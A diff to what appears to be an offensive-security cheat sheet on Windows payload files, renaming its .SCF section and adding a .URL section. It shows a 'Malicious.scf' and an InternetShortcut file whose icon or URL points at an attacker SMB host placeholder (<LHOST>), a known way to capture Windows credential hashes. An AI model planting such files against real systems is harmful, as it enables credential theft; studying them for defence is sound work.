@@ -5,7 +5,8 @@
 ## Table of Contents
 
 - [.LNK (Link) Files](#lnk-link-file)
-- [.SCF (Shell Command File) File](#scf-shell-command-file-file)
+- [.SCF (Shell Command File) Files](#scf-shell-command-file-files)
+- [.URL (URL) Files](#url-uniform-resource-locator-files)
 - [An HTML Application (HTA)](#an-html-application-hta)
 - [AtomicsDLLSide-Loading .hta File](#atomicsdllside-loading-hta-file)
 - [Background Reverse Shells](#background-reverse-shells)
@@ -125,7 +126,7 @@ $shortcut.Save()
 C:\> attrib -h Z:\PATH\TO\FOLDER\<FOLDER>
 ```
 
-## .SCF (Shell Command File) File
+## .SCF (Shell Command File) Files
 
 ### Malicious.scf
 
@@ -135,6 +136,13 @@ Command=2
 Iconfile=\\<LHOST>\foobar
 [Taskbar]
 Command=ToggleDesktop
+```
+
+## .URL (Uniform Resource Locator) Files
+
+```c
+[InternetShortcut]
+URL=\\<LHOST>\<SHARE>\<FILE>
 ```
 
 ## An HTML Application (HTA)
